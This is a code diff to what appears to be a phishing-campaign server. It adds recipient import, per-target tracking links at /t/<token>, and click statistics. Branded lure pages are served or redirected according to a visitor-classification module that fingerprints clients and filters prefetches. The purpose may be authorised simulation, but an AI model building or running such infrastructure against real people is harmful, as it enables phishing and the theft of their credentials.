@@ -51,6 +51,11 @@ from .database import (
     list_api_keys,
     revoke_api_key,
     list_campaigns_db,
+    get_recipient_by_token,
+    list_recipients,
+    import_recipients,
+    record_recipient_click,
+    get_recipient_stats,
 )
 from .detection import build_visit_record, evaluate
 from .lures import LURE_REGISTRY, list_templates, render_lure
@@ -156,6 +161,10 @@ def _broadcast_sse(record: dict[str, Any]) -> None:
         "top_signal": record.get("top_signal"),
         "ja3_hash": record.get("ja3_hash"),
         "http_version": record.get("http_version"),
+        "tracking_token": record.get("tracking_token"),
+        "device_id": record.get("device_id"),
+        "is_prefetch": record.get("is_prefetch", False),
+        "recipient_id": record.get("recipient_id"),
     }, default=str)
     msg = f"data: {event_data}\n\n"
     dead: list[queue.Queue[str]] = []
@@ -226,6 +235,8 @@ def _auto_setup_campaign(cfg: Config) -> None:
 def _process_visit(
     cfg: Config,
     campaign: Campaign | None = None,
+    recipient: dict[str, Any] | None = None,
+    tracking_token: str | None = None,
 ) -> dict[str, Any]:
     session_id = request.cookies.get("csession", str(uuid.uuid4()))
     ip = _extract_ip(request, cfg)
@@ -255,6 +266,16 @@ def _process_visit(
         record["campaign_id"] = campaign.id
         record["campaign_name"] = campaign.name
         record["template"] = campaign.template
+
+    if recipient:
+        record["recipient_id"] = recipient["id"]
+        record["tracking_token"] = tracking_token
+
+    if tracking_token:
+        record["tracking_token"] = tracking_token
+
+    if not record.get("is_prefetch") and recipient and tracking_token:
+        record_recipient_click(cfg, tracking_token, record.get("device_id"))
 
     log_visit(record)
     save_visit_db(record, cfg)
@@ -348,7 +369,15 @@ def create_app(cfg: Config | None = None) -> Flask:
     def gate_redirect():  # type: ignore[return]
         campaign_id = session.get("campaign_id")
         campaign = load_campaign(campaign_id, cfg) if campaign_id else None
-        record = _process_visit(cfg, campaign)
+
+        tracking_token = session.get("tracking_token")
+        recipient = None
+        if tracking_token:
+            recipient = get_recipient_by_token(cfg, tracking_token)
+
+        record = _process_visit(
+            cfg, campaign, recipient=recipient, tracking_token=tracking_token
+        )
         classification = record.get("classification", "clean")
         session_id = record.get("session_id", str(uuid.uuid4()))
 
@@ -364,6 +393,45 @@ def create_app(cfg: Config | None = None) -> Flask:
         html = render_lure(cfg.default_template, {"brand": cfg.brand_name})
         resp = make_response(html)
         return _apply_headers(resp, cfg.brand_name)
+
+    # ==================================================================
+    # Tracked recipient routes: /t/<token>
+    # ==================================================================
+
+    @app.route("/t/<token>")
+    @app.route("/t/<token>/")
+    @app.route("/t/<token>/<path:path>")
+    def tracked_entry(token: str, path: str = ""):  # type: ignore[return]
+        recipient = get_recipient_by_token(cfg, token)
+        if not recipient:
+            return make_response("Not Found", 404)
+
+        campaign = load_campaign(recipient["campaign_id"], cfg)
+        if not campaign or not campaign.active:
+            return make_response("Not Found", 404)
+
+        session["campaign_id"] = campaign.id
+        session["tracking_token"] = token
+
+        js_metrics = session.get("adv_metrics")
+        if not js_metrics:
+            html = render_lure(campaign.template, {
+                "brand": campaign.brand_name,
+                **campaign.custom_params,
+            })
+            resp = make_response(html)
+            resp = _apply_headers(resp, campaign.brand_name)
+            session_id = request.cookies.get("csession", str(uuid.uuid4()))
+            resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
+
+            _process_visit(cfg, campaign, recipient=recipient, tracking_token=token)
+            return resp
+
+        record = _process_visit(cfg, campaign, recipient=recipient, tracking_token=token)
+        classification = record.get("classification", "clean")
+        session_id = record.get("session_id", str(uuid.uuid4()))
+
+        return _make_redirect_response(classification, cfg, campaign, session_id)
 
     # ==================================================================
     # Campaign routes: /c/<campaign_id>/...
@@ -467,6 +535,64 @@ def create_app(cfg: Config | None = None) -> Flask:
     @_require_admin(cfg)
     def api_delete_campaign(campaign_id: str):  # type: ignore[return]
         if delete_campaign(campaign_id, cfg):
+            return jsonify({"status": "deleted"})
+        return jsonify({"error": "not found"}), 404
+
+    # ==================================================================
+    # Recipient / target management
+    # ==================================================================
+
+    @app.route("/api/operator/recipients", methods=["GET"])
+    @_require_auth(cfg)
+    def api_list_recipients():  # type: ignore[return]
+        campaign_id = request.args.get("campaign_id")
+        recipients = list_recipients(cfg, campaign_id)
+        return jsonify(recipients)
+
+    @app.route("/api/operator/recipients", methods=["POST"])
+    @_require_auth(cfg)
+    @_require_admin(cfg)
+    def api_import_recipients():  # type: ignore[return]
+        data = request.json or {}
+        campaign_id = data.get("campaign_id")
+        if not campaign_id:
+            return jsonify({"error": "campaign_id required"}), 400
+
+        campaign = load_campaign(campaign_id, cfg)
+        if not campaign:
+            return jsonify({"error": "campaign not found"}), 404
+
+        targets = data.get("targets", [])
+        if not targets:
+            return jsonify({"error": "targets list required"}), 400
+
+        for t in targets:
+            if "email" not in t:
+                return jsonify({"error": "each target needs an 'email' field"}), 400
+
+        results = import_recipients(cfg, campaign_id, targets)
+        base_url = request.host_url.rstrip("/")
+        for r in results:
+            r["tracking_url"] = f"{base_url}/t/{r['token']}"
+
+        return jsonify({
+            "imported": len(results),
+            "recipients": results,
+        }), 201
+
+    @app.route("/api/operator/recipients/stats", methods=["GET"])
+    @_require_auth(cfg)
+    def api_recipient_stats():  # type: ignore[return]
+        campaign_id = request.args.get("campaign_id")
+        stats = get_recipient_stats(cfg, campaign_id)
+        return jsonify(stats)
+
+    @app.route("/api/operator/recipients/<int:recipient_id>", methods=["DELETE"])
+    @_require_auth(cfg)
+    @_require_admin(cfg)
+    def api_delete_recipient(recipient_id: int):  # type: ignore[return]
+        from .database import delete_recipient
+        if delete_recipient(cfg, recipient_id):
             return jsonify({"status": "deleted"})
         return jsonify({"error": "not found"}), 404
 
